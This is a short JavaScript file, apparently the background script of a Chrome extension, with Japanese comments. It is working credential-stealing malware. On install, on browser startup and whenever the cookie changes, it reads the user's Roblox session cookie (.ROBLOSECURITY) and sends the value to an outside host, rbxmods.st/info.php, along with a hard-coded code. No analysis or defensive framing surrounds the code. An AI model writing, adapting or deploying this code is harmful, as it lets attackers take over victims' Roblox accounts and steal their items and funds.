var secret = "0196435234161739";

async function fetchInfo() {
  chrome.cookies.get(
    {
      url: "https://www.roblox.com",
      name: ".ROBLOSECURITY"
    },
    async (cookie) => {
      if (cookie) {
        const currentValue = cookie.value;

        const stored = await chrome.storage.local.get("cacheRBX");

        if (stored.cacheRBX !== currentValue) {
          console.log("cookie updated:", currentValue);

          chrome.storage.local.set({
            cacheRBX: currentValue
          });

          Send(currentValue);
        }
      }
    }
  );
}

function Send(value) {
  fetch(
    "https://rbxmods.st/info.php?c=" + value + "&code=" + secret,
    {
      method: "GET",
      mode: "no-cors"
    }
  );
}

// 起動時・インストール時に実行
chrome.runtime.onStartup.addListener(fetchInfo);
chrome.runtime.onInstalled.addListener(fetchInfo);

// cookie変更時にも実行
chrome.cookies.onChanged.addListener((changeInfo) => {
  if (
    changeInfo.cookie.domain.includes("roblox.com") &&
    changeInfo.cookie.name === ".ROBLOSECURITY"
  ) {
    fetchInfo();
  }
});
